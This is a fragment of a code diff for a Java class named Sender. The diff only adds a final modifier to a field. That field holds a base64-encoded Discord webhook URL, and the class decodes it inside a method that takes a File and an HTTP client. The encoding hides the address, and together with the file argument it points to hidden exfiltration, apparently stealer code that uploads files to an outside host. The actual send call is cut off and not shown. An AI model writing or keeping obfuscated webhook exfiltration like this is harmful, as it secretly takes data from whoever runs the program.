@@ -10,7 +10,7 @@ import java.util.Base64;
 public class Sender {
     private static final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");
 
-    static String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzQxODg2MTUwNDE3MjEzMi95RU5zdmdJd0U0MzJhUTZBU016VG4yVGNSWXh3V19adUtRcVJFMzRhRnNxZzNJMVF6YU93cmJGamJnQVdMeVJKS0QtVA==";
+    static final String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4NzQxODg2MTUwNDE3MjEzMi95RU5zdmdJd0U0MzJhUTZBU016VG4yVGNSWXh3V19adUtRcVJFMzRhRnNxZzNJMVF6YU93cmJGamJnQVdMeVJKS0QtVA==";
 
     public static void Sender(OkHttpClient client, File file, RequestBody requestBody) throws IOException {
         byte[] decodedBytes = Base64.getDecoder().decode(a);
